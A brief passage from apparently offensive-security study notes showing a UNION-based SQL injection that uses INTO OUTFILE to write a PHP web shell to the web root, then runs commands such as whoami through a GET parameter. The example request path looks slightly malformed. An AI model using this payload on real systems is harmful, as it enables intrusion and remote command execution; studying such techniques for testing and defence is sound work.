In other database scenarios we can abuse the `SELECT INTO_OUTFILE` statement and we can try to upload something malicious in the webserver. We must have write permission in the folder we will write the file into.

```sql
' UNION SELECT "<?php system($_GET['cmd']);?>", null, null, null, null INTO OUTFILE "/var/www/html/tmp/webshell.php" -- //
```

Next, with a simple GET request like `/tmp/cmd=whoami` we can execute commands on the webserver.
